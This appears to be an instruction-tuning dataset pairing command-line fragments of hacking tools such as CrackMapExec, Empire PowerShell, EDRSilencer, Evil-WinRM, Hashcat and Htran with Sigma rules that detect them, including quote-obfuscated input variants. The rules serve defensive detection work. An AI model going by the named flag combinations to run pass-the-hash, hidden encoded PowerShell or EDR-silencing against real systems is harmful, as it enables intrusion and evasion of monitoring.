{"instruction": "Write Sigma rule to detect payload:", "input": "\\crackmapexec.exe -M pe_inject --local-auth -u -x --local-auth -u -p -H 'NTHASH' mssql -u -p -M -d smb -u -H -M -o smb -u -p --local-auth --local-auth -u -p 10. 192.168. /24", "output": "title: HackTool - CrackMapExec Execution\nid: 42a993dd-bb3e-48c8-b372-4d6684c4106c\nstatus: test\ndescription: This rule detect common flag combinations used by CrackMapExec in order to detect its use even if the binary has been replaced.\nreferences:\n    - https://mpgn.gitbook.io/crackmapexec/smb-protocol/authentication/checking-credentials-local\n    - https://www.mandiant.com/resources/telegram-malware-iranian-espionage\n    - https://www.infosecmatter.com/crackmapexec-module-library/?cmem=mssql-mimikatz\n    - https://www.infosecmatter.com/crackmapexec-module-library/?cmem=smb-pe_inject\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-02-25\nmodified: 2023-03-08\ntags:\n    - attack.execution\n    - attack.persistence\n    - attack.privilege-escalation\n    - attack.credential-access\n    - attack.discovery\n    - attack.t1047\n    - attack.t1053\n    - attack.t1059.003\n    - attack.t1059.001\n    - attack.t1110\n    - attack.t1201\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_binary:\n        Image|endswith: '\\crackmapexec.exe'\n    selection_special:\n        CommandLine|contains: ' -M pe_inject '\n    selection_execute:\n        CommandLine|contains|all:\n            - ' --local-auth'\n            - ' -u '\n            - ' -x '\n    selection_hash:\n        CommandLine|contains|all:\n            - ' --local-auth'\n            - ' -u '\n            - ' -p '\n            - \" -H 'NTHASH'\"\n    selection_module_mssql:\n        CommandLine|contains|all:\n            - ' mssql '\n            - ' -u '\n            - ' -p '\n            - ' -M '\n            - ' -d '\n    selection_module_smb1:\n        CommandLine|contains|all:\n            - ' smb '\n            - ' -u '\n            - ' -H '\n            - ' -M '\n            - ' -o '\n    selection_module_smb2:\n        CommandLine|contains|all:\n            - ' smb '\n            - ' -u '\n            - ' -p '\n            - ' --local-auth'\n    part_localauth_1:\n        CommandLine|contains|all:\n            - ' --local-auth'\n            - ' -u '\n            - ' -p '\n    part_localauth_2:\n        CommandLine|contains|all:\n            - ' 10.'\n            - ' 192.168.'\n            - '/24 '\n    condition: 1 of selection_* or all of part_localauth*\nfields:\n    - ComputerName\n    - User\n    - CommandLine\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\crackmapexec.exe -M pe_i\"nject\" --local-auth -u -x --local-auth -u -p -H 'NTHASH' mssql -u -p -M -d smb -u -H -M -o smb -u -p --local-auth --local-auth -u -p 10. 192.168. /24", "output": "title: HackTool - CrackMapExec Execution\nid: 42a993dd-bb3e-48c8-b372-4d6684c4106c\nstatus: test\ndescription: This rule detect common flag combinations used by CrackMapExec in order to detect its use even if the binary has been replaced.\nreferences:\n    - https://mpgn.gitbook.io/crackmapexec/smb-protocol/authentication/checking-credentials-local\n    - https://www.mandiant.com/resources/telegram-malware-iranian-espionage\n    - https://www.infosecmatter.com/crackmapexec-module-library/?cmem=mssql-mimikatz\n    - https://www.infosecmatter.com/crackmapexec-module-library/?cmem=smb-pe_inject\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-02-25\nmodified: 2023-03-08\ntags:\n    - attack.execution\n    - attack.persistence\n    - attack.privilege-escalation\n    - attack.credential-access\n    - attack.discovery\n    - attack.t1047\n    - attack.t1053\n    - attack.t1059.003\n    - attack.t1059.001\n    - attack.t1110\n    - attack.t1201\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_binary:\n        Image|endswith: '\\crackmapexec.exe'\n    selection_special:\n        CommandLine|contains: ' -M pe_inject '\n    selection_execute:\n        CommandLine|contains|all:\n            - ' --local-auth'\n            - ' -u '\n            - ' -x '\n    selection_hash:\n        CommandLine|contains|all:\n            - ' --local-auth'\n            - ' -u '\n            - ' -p '\n            - \" -H 'NTHASH'\"\n    selection_module_mssql:\n        CommandLine|contains|all:\n            - ' mssql '\n            - ' -u '\n            - ' -p '\n            - ' -M '\n            - ' -d '\n    selection_module_smb1:\n        CommandLine|contains|all:\n            - ' smb '\n            - ' -u '\n            - ' -H '\n            - ' -M '\n            - ' -o '\n    selection_module_smb2:\n        CommandLine|contains|all:\n            - ' smb '\n            - ' -u '\n            - ' -p '\n            - ' --local-auth'\n    part_localauth_1:\n        CommandLine|contains|all:\n            - ' --local-auth'\n            - ' -u '\n            - ' -p '\n    part_localauth_2:\n        CommandLine|contains|all:\n            - ' 10.'\n            - ' 192.168.'\n            - '/24 '\n    condition: 1 of selection_* or all of part_localauth*\nfields:\n    - ComputerName\n    - User\n    - CommandLine\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\crackmapexec -M pe_inject --local-auth -u -x --local-auth -u -p -H 'NTHASH' mssql -u -p -M -d smb -u -H -M -o smb -u -p --local-auth --local-auth -u -p 10. 192.168. /24", "output": "title: HackTool - CrackMapExec Execution\nid: 42a993dd-bb3e-48c8-b372-4d6684c4106c\nstatus: test\ndescription: This rule detect common flag combinations used by CrackMapExec in order to detect its use even if the binary has been replaced.\nreferences:\n    - https://mpgn.gitbook.io/crackmapexec/smb-protocol/authentication/checking-credentials-local\n    - https://www.mandiant.com/resources/telegram-malware-iranian-espionage\n    - https://www.infosecmatter.com/crackmapexec-module-library/?cmem=mssql-mimikatz\n    - https://www.infosecmatter.com/crackmapexec-module-library/?cmem=smb-pe_inject\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-02-25\nmodified: 2023-03-08\ntags:\n    - attack.execution\n    - attack.persistence\n    - attack.privilege-escalation\n    - attack.credential-access\n    - attack.discovery\n    - attack.t1047\n    - attack.t1053\n    - attack.t1059.003\n    - attack.t1059.001\n    - attack.t1110\n    - attack.t1201\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_binary:\n        Image|endswith: '\\crackmapexec.exe'\n    selection_special:\n        CommandLine|contains: ' -M pe_inject '\n    selection_execute:\n        CommandLine|contains|all:\n            - ' --local-auth'\n            - ' -u '\n            - ' -x '\n    selection_hash:\n        CommandLine|contains|all:\n            - ' --local-auth'\n            - ' -u '\n            - ' -p '\n            - \" -H 'NTHASH'\"\n    selection_module_mssql:\n        CommandLine|contains|all:\n            - ' mssql '\n            - ' -u '\n            - ' -p '\n            - ' -M '\n            - ' -d '\n    selection_module_smb1:\n        CommandLine|contains|all:\n            - ' smb '\n            - ' -u '\n            - ' -H '\n            - ' -M '\n            - ' -o '\n    selection_module_smb2:\n        CommandLine|contains|all:\n            - ' smb '\n            - ' -u '\n            - ' -p '\n            - ' --local-auth'\n    part_localauth_1:\n        CommandLine|contains|all:\n            - ' --local-auth'\n            - ' -u '\n            - ' -p '\n    part_localauth_2:\n        CommandLine|contains|all:\n            - ' 10.'\n            - ' 192.168.'\n            - '/24 '\n    condition: 1 of selection_* or all of part_localauth*\nfields:\n    - ComputerName\n    - User\n    - CommandLine\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\crackmapexec.exe -M pe_inject --local-auth -u -x --local-auth -u -p -H 'NTHASH' mssql -u -p -M -d smb -u -H -M -o smb -u -p --local-auth --local-auth -u -p 10. 192.168. /24", "output": "title: HackTool - CrackMapExec Execution\nid: 42a993dd-bb3e-48c8-b372-4d6684c4106c\nstatus: test\ndescription: This rule detect common flag combinations used by CrackMapExec in order to detect its use even if the binary has been replaced.\nreferences:\n    - https://mpgn.gitbook.io/crackmapexec/smb-protocol/authentication/checking-credentials-local\n    - https://www.mandiant.com/resources/telegram-malware-iranian-espionage\n    - https://www.infosecmatter.com/crackmapexec-module-library/?cmem=mssql-mimikatz\n    - https://www.infosecmatter.com/crackmapexec-module-library/?cmem=smb-pe_inject\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-02-25\nmodified: 2023-03-08\ntags:\n    - attack.execution\n    - attack.persistence\n    - attack.privilege-escalation\n    - attack.credential-access\n    - attack.discovery\n    - attack.t1047\n    - attack.t1053\n    - attack.t1059.003\n    - attack.t1059.001\n    - attack.t1110\n    - attack.t1201\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_binary:\n        Image|endswith: '\\crackmapexec.exe'\n    selection_special:\n        CommandLine|contains: ' -M pe_inject '\n    selection_execute:\n        CommandLine|contains|all:\n            - ' --local-auth'\n            - ' -u '\n            - ' -x '\n    selection_hash:\n        CommandLine|contains|all:\n            - ' --local-auth'\n            - ' -u '\n            - ' -p '\n            - \" -H 'NTHASH'\"\n    selection_module_mssql:\n        CommandLine|contains|all:\n            - ' mssql '\n            - ' -u '\n            - ' -p '\n            - ' -M '\n            - ' -d '\n    selection_module_smb1:\n        CommandLine|contains|all:\n            - ' smb '\n            - ' -u '\n            - ' -H '\n            - ' -M '\n            - ' -o '\n    selection_module_smb2:\n        CommandLine|contains|all:\n            - ' smb '\n            - ' -u '\n            - ' -p '\n            - ' --local-auth'\n    part_localauth_1:\n        CommandLine|contains|all:\n            - ' --local-auth'\n            - ' -u '\n            - ' -p '\n    part_localauth_2:\n        CommandLine|contains|all:\n            - ' 10.'\n            - ' 192.168.'\n            - '/24 '\n    condition: 1 of selection_* or all of part_localauth*\nfields:\n    - ComputerName\n    - User\n    - CommandLine\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "/am51 /password", "output": "title: HackTool - DInjector PowerShell Cradle Execution\nid: d78b5d61-187d-44b6-bf02-93486a80de5a\nstatus: test\ndescription: Detects the use of the Dinject PowerShell cradle based on the specific flags\nreferences:\n    - https://web.archive.org/web/20211001064856/https://github.com/snovvcrash/DInjector # Original got deleted. This is a fork\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-12-07\nmodified: 2023-02-04\ntags:\n    - attack.defense-evasion\n    - attack.t1055\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - ' /am51'\n            - ' /password'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: critical"}
{"instruction": "Write Sigma rule to detect payload:", "input": "/am51 /password", "output": "title: HackTool - DInjector PowerShell Cradle Execution\nid: d78b5d61-187d-44b6-bf02-93486a80de5a\nstatus: test\ndescription: Detects the use of the Dinject PowerShell cradle based on the specific flags\nreferences:\n    - https://web.archive.org/web/20211001064856/https://github.com/snovvcrash/DInjector # Original got deleted. This is a fork\nauthor: Florian Roth (Nextron Systems)\ndate: 2021-12-07\nmodified: 2023-02-04\ntags:\n    - attack.defense-evasion\n    - attack.t1055\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - ' /am51'\n            - ' /password'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: critical"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\EDRSilencer.exe EDRSilencer.exe EDRSilencer", "output": "title: HackTool - EDRSilencer Execution\nid: eb2d07d4-49cb-4523-801a-da002df36602\nstatus: test\ndescription: |\n    Detects the execution of EDRSilencer, a tool that leverages Windows Filtering Platform (WFP) to block Endpoint Detection and Response (EDR) agents from reporting security events to the server based on PE metadata information.\nreferences:\n    - https://github.com/netero1010/EDRSilencer\nauthor: '@gott_cyber'\ndate: 2024-01-02\ntags:\n    - attack.defense-evasion\n    - attack.t1562\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\EDRSilencer.exe'\n        - OriginalFileName: 'EDRSilencer.exe'\n        - Description|contains: 'EDRSilencer'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\EDRSilencer.exe \\\"EDRSile\\\"ncer.exe EDRSilencer", "output": "title: HackTool - EDRSilencer Execution\nid: eb2d07d4-49cb-4523-801a-da002df36602\nstatus: test\ndescription: |\n    Detects the execution of EDRSilencer, a tool that leverages Windows Filtering Platform (WFP) to block Endpoint Detection and Response (EDR) agents from reporting security events to the server based on PE metadata information.\nreferences:\n    - https://github.com/netero1010/EDRSilencer\nauthor: '@gott_cyber'\ndate: 2024-01-02\ntags:\n    - attack.defense-evasion\n    - attack.t1562\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\EDRSilencer.exe'\n        - OriginalFileName: 'EDRSilencer.exe'\n        - Description|contains: 'EDRSilencer'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\EDRSilencer EDRSilencer EDRSilencer", "output": "title: HackTool - EDRSilencer Execution\nid: eb2d07d4-49cb-4523-801a-da002df36602\nstatus: test\ndescription: |\n    Detects the execution of EDRSilencer, a tool that leverages Windows Filtering Platform (WFP) to block Endpoint Detection and Response (EDR) agents from reporting security events to the server based on PE metadata information.\nreferences:\n    - https://github.com/netero1010/EDRSilencer\nauthor: '@gott_cyber'\ndate: 2024-01-02\ntags:\n    - attack.defense-evasion\n    - attack.t1562\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\EDRSilencer.exe'\n        - OriginalFileName: 'EDRSilencer.exe'\n        - Description|contains: 'EDRSilencer'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\EDRSilencer.exe EDRSilencer EDRSilencer.exe", "output": "title: HackTool - EDRSilencer Execution\nid: eb2d07d4-49cb-4523-801a-da002df36602\nstatus: test\ndescription: |\n    Detects the execution of EDRSilencer, a tool that leverages Windows Filtering Platform (WFP) to block Endpoint Detection and Response (EDR) agents from reporting security events to the server based on PE metadata information.\nreferences:\n    - https://github.com/netero1010/EDRSilencer\nauthor: '@gott_cyber'\ndate: 2024-01-02\ntags:\n    - attack.defense-evasion\n    - attack.t1562\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\EDRSilencer.exe'\n        - OriginalFileName: 'EDRSilencer.exe'\n        - Description|contains: 'EDRSilencer'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "-NoP -sta -NonI -W Hidden -Enc -noP -sta -w 1 -enc -NoP -NonI -W Hidden -enc -noP -sta -w 1 -enc -enc SQB -nop -exec bypass -EncodedCommand", "output": "title: HackTool - Empire PowerShell Launch Parameters\nid: 79f4ede3-402e-41c8-bc3e-ebbf5f162581\nstatus: test\ndescription: Detects suspicious powershell command line parameters used in Empire\nreferences:\n    - https://github.com/EmpireProject/Empire/blob/c2ba61ca8d2031dad0cfc1d5770ba723e8b710db/lib/common/helpers.py#L165\n    - https://github.com/EmpireProject/Empire/blob/e37fb2eef8ff8f5a0a689f1589f424906fe13055/lib/modules/powershell/persistence/powerbreach/deaduser.py#L191\n    - https://github.com/EmpireProject/Empire/blob/e37fb2eef8ff8f5a0a689f1589f424906fe13055/lib/modules/powershell/persistence/powerbreach/resolver.py#L178\n    - https://github.com/EmpireProject/Empire/blob/e37fb2eef8ff8f5a0a689f1589f424906fe13055/data/module_source/privesc/Invoke-EventVwrBypass.ps1#L64\nauthor: Florian Roth (Nextron Systems)\ndate: 2019-04-20\nmodified: 2023-02-21\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - ' -NoP -sta -NonI -W Hidden -Enc '\n            - ' -noP -sta -w 1 -enc '\n            - ' -NoP -NonI -W Hidden -enc '\n            - ' -noP -sta -w 1 -enc'\n            - ' -enc  SQB'\n            - ' -nop -exec bypass -EncodedCommand '\n    condition: selection\nfalsepositives:\n    - Other tools that incidentally use the same command line parameters\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "-NoP -sta -NonI -W Hidden -Enc -noP -sta -w 1 -enc -NoP -NonI -W Hidden -enc \\\"-noP\\\" -sta -w 1 -enc -enc SQB -nop -exec bypass -EncodedCommand", "output": "title: HackTool - Empire PowerShell Launch Parameters\nid: 79f4ede3-402e-41c8-bc3e-ebbf5f162581\nstatus: test\ndescription: Detects suspicious powershell command line parameters used in Empire\nreferences:\n    - https://github.com/EmpireProject/Empire/blob/c2ba61ca8d2031dad0cfc1d5770ba723e8b710db/lib/common/helpers.py#L165\n    - https://github.com/EmpireProject/Empire/blob/e37fb2eef8ff8f5a0a689f1589f424906fe13055/lib/modules/powershell/persistence/powerbreach/deaduser.py#L191\n    - https://github.com/EmpireProject/Empire/blob/e37fb2eef8ff8f5a0a689f1589f424906fe13055/lib/modules/powershell/persistence/powerbreach/resolver.py#L178\n    - https://github.com/EmpireProject/Empire/blob/e37fb2eef8ff8f5a0a689f1589f424906fe13055/data/module_source/privesc/Invoke-EventVwrBypass.ps1#L64\nauthor: Florian Roth (Nextron Systems)\ndate: 2019-04-20\nmodified: 2023-02-21\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - ' -NoP -sta -NonI -W Hidden -Enc '\n            - ' -noP -sta -w 1 -enc '\n            - ' -NoP -NonI -W Hidden -enc '\n            - ' -noP -sta -w 1 -enc'\n            - ' -enc  SQB'\n            - ' -nop -exec bypass -EncodedCommand '\n    condition: selection\nfalsepositives:\n    - Other tools that incidentally use the same command line parameters\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "-NoP -sta -NonI -W Hidden -Enc -noP -sta -w 1 -enc -NoP -NonI -W Hidden -enc -noP -sta -w 1 -enc -enc SQB -nop -exec bypass -EncodedCommand", "output": "title: HackTool - Empire PowerShell Launch Parameters\nid: 79f4ede3-402e-41c8-bc3e-ebbf5f162581\nstatus: test\ndescription: Detects suspicious powershell command line parameters used in Empire\nreferences:\n    - https://github.com/EmpireProject/Empire/blob/c2ba61ca8d2031dad0cfc1d5770ba723e8b710db/lib/common/helpers.py#L165\n    - https://github.com/EmpireProject/Empire/blob/e37fb2eef8ff8f5a0a689f1589f424906fe13055/lib/modules/powershell/persistence/powerbreach/deaduser.py#L191\n    - https://github.com/EmpireProject/Empire/blob/e37fb2eef8ff8f5a0a689f1589f424906fe13055/lib/modules/powershell/persistence/powerbreach/resolver.py#L178\n    - https://github.com/EmpireProject/Empire/blob/e37fb2eef8ff8f5a0a689f1589f424906fe13055/data/module_source/privesc/Invoke-EventVwrBypass.ps1#L64\nauthor: Florian Roth (Nextron Systems)\ndate: 2019-04-20\nmodified: 2023-02-21\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - ' -NoP -sta -NonI -W Hidden -Enc '\n            - ' -noP -sta -w 1 -enc '\n            - ' -NoP -NonI -W Hidden -enc '\n            - ' -noP -sta -w 1 -enc'\n            - ' -enc  SQB'\n            - ' -nop -exec bypass -EncodedCommand '\n    condition: selection\nfalsepositives:\n    - Other tools that incidentally use the same command line parameters\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\ruby.exe -i -u -p", "output": "title: HackTool - WinRM Access Via Evil-WinRM\nid: a197e378-d31b-41c0-9635-cfdf1c1bb423\nstatus: test\ndescription: Adversaries may use Valid Accounts to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1021.006/T1021.006.md#atomic-test-3---winrm-access-with-evil-winrm\n    - https://github.com/Hackplayers/evil-winrm\nauthor: frack113\ndate: 2022-01-07\nmodified: 2023-02-13\ntags:\n    - attack.lateral-movement\n    - attack.t1021.006\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\ruby.exe'\n        CommandLine|contains|all:\n            - '-i '\n            - '-u '\n            - '-p '\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\ruby.exe -i \\\"-u\\\" -p", "output": "title: HackTool - WinRM Access Via Evil-WinRM\nid: a197e378-d31b-41c0-9635-cfdf1c1bb423\nstatus: test\ndescription: Adversaries may use Valid Accounts to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1021.006/T1021.006.md#atomic-test-3---winrm-access-with-evil-winrm\n    - https://github.com/Hackplayers/evil-winrm\nauthor: frack113\ndate: 2022-01-07\nmodified: 2023-02-13\ntags:\n    - attack.lateral-movement\n    - attack.t1021.006\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\ruby.exe'\n        CommandLine|contains|all:\n            - '-i '\n            - '-u '\n            - '-p '\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\ruby -i -u -p", "output": "title: HackTool - WinRM Access Via Evil-WinRM\nid: a197e378-d31b-41c0-9635-cfdf1c1bb423\nstatus: test\ndescription: Adversaries may use Valid Accounts to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1021.006/T1021.006.md#atomic-test-3---winrm-access-with-evil-winrm\n    - https://github.com/Hackplayers/evil-winrm\nauthor: frack113\ndate: 2022-01-07\nmodified: 2023-02-13\ntags:\n    - attack.lateral-movement\n    - attack.t1021.006\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\ruby.exe'\n        CommandLine|contains|all:\n            - '-i '\n            - '-u '\n            - '-p '\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\ruby.exe -u -i -p", "output": "title: HackTool - WinRM Access Via Evil-WinRM\nid: a197e378-d31b-41c0-9635-cfdf1c1bb423\nstatus: test\ndescription: Adversaries may use Valid Accounts to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1021.006/T1021.006.md#atomic-test-3---winrm-access-with-evil-winrm\n    - https://github.com/Hackplayers/evil-winrm\nauthor: frack113\ndate: 2022-01-07\nmodified: 2023-02-13\ntags:\n    - attack.lateral-movement\n    - attack.t1021.006\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\ruby.exe'\n        CommandLine|contains|all:\n            - '-i '\n            - '-u '\n            - '-p '\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\hashcat.exe -a -m 1000 -r", "output": "title: HackTool - Hashcat Password Cracker Execution\nid: 39b31e81-5f5f-4898-9c0e-2160cfc0f9bf\nstatus: test\ndescription: Execute Hashcat.exe with provided SAM file from registry of Windows and Password list to crack against\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1110.002/T1110.002.md#atomic-test-1---password-cracking-with-hashcat\n    - https://hashcat.net/wiki/doku.php?id=hashcat\nauthor: frack113\ndate: 2021-12-27\nmodified: 2023-02-04\ntags:\n    - attack.credential-access\n    - attack.t1110.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        Image|endswith: '\\hashcat.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - '-a '\n            - '-m 1000 '\n            - '-r '\n    condition: 1 of selection_*\nfalsepositives:\n    - Tools that use similar command line flags and values\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\hashcat.exe -a -m \"1\"\"0\"\"0\"\"0\" -r", "output": "title: HackTool - Hashcat Password Cracker Execution\nid: 39b31e81-5f5f-4898-9c0e-2160cfc0f9bf\nstatus: test\ndescription: Execute Hashcat.exe with provided SAM file from registry of Windows and Password list to crack against\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1110.002/T1110.002.md#atomic-test-1---password-cracking-with-hashcat\n    - https://hashcat.net/wiki/doku.php?id=hashcat\nauthor: frack113\ndate: 2021-12-27\nmodified: 2023-02-04\ntags:\n    - attack.credential-access\n    - attack.t1110.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        Image|endswith: '\\hashcat.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - '-a '\n            - '-m 1000 '\n            - '-r '\n    condition: 1 of selection_*\nfalsepositives:\n    - Tools that use similar command line flags and values\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\hashcat -a -m 1000 -r", "output": "title: HackTool - Hashcat Password Cracker Execution\nid: 39b31e81-5f5f-4898-9c0e-2160cfc0f9bf\nstatus: test\ndescription: Execute Hashcat.exe with provided SAM file from registry of Windows and Password list to crack against\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1110.002/T1110.002.md#atomic-test-1---password-cracking-with-hashcat\n    - https://hashcat.net/wiki/doku.php?id=hashcat\nauthor: frack113\ndate: 2021-12-27\nmodified: 2023-02-04\ntags:\n    - attack.credential-access\n    - attack.t1110.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        Image|endswith: '\\hashcat.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - '-a '\n            - '-m 1000 '\n            - '-r '\n    condition: 1 of selection_*\nfalsepositives:\n    - Tools that use similar command line flags and values\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\hashcat.exe -a -m -r 1000", "output": "title: HackTool - Hashcat Password Cracker Execution\nid: 39b31e81-5f5f-4898-9c0e-2160cfc0f9bf\nstatus: test\ndescription: Execute Hashcat.exe with provided SAM file from registry of Windows and Password list to crack against\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1110.002/T1110.002.md#atomic-test-1---password-cracking-with-hashcat\n    - https://hashcat.net/wiki/doku.php?id=hashcat\nauthor: frack113\ndate: 2021-12-27\nmodified: 2023-02-04\ntags:\n    - attack.credential-access\n    - attack.t1110.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        Image|endswith: '\\hashcat.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - '-a '\n            - '-m 1000 '\n            - '-r '\n    condition: 1 of selection_*\nfalsepositives:\n    - Tools that use similar command line flags and values\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\htran.exe \\lcx.exe .exe -tran .exe -slave", "output": "title: HackTool - Htran/NATBypass Execution\nid: f5e3b62f-e577-4e59-931e-0a15b2b94e1e\nstatus: test\ndescription: Detects executable names or flags used by Htran or Htran-like tools (e.g. NATBypass)\nreferences:\n    - https://github.com/HiwinCN/HTran\n    - https://github.com/cw1997/NATBypass\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-12-27\nmodified: 2023-02-04\ntags:\n    - attack.command-and-control\n    - attack.t1090\n    - attack.s0040\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        Image|endswith:\n            - '\\htran.exe'\n            - '\\lcx.exe'\n    selection_cli:\n        CommandLine|contains:\n            - '.exe -tran '\n            - '.exe -slave '\n    condition: 1 of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\htran.exe \\lcx.exe .exe -tran .exe \"-slave\"", "output": "title: HackTool - Htran/NATBypass Execution\nid: f5e3b62f-e577-4e59-931e-0a15b2b94e1e\nstatus: test\ndescription: Detects executable names or flags used by Htran or Htran-like tools (e.g. NATBypass)\nreferences:\n    - https://github.com/HiwinCN/HTran\n    - https://github.com/cw1997/NATBypass\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-12-27\nmodified: 2023-02-04\ntags:\n    - attack.command-and-control\n    - attack.t1090\n    - attack.s0040\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        Image|endswith:\n            - '\\htran.exe'\n            - '\\lcx.exe'\n    selection_cli:\n        CommandLine|contains:\n            - '.exe -tran '\n            - '.exe -slave '\n    condition: 1 of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\htran \\lcx -tran -slave", "output": "title: HackTool - Htran/NATBypass Execution\nid: f5e3b62f-e577-4e59-931e-0a15b2b94e1e\nstatus: test\ndescription: Detects executable names or flags used by Htran or Htran-like tools (e.g. NATBypass)\nreferences:\n    - https://github.com/HiwinCN/HTran\n    - https://github.com/cw1997/NATBypass\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-12-27\nmodified: 2023-02-04\ntags:\n    - attack.command-and-control\n    - attack.t1090\n    - attack.s0040\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        Image|endswith:\n            - '\\htran.exe'\n            - '\\lcx.exe'\n    selection_cli:\n        CommandLine|contains:\n            - '.exe -tran '\n            - '.exe -slave '\n    condition: 1 of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
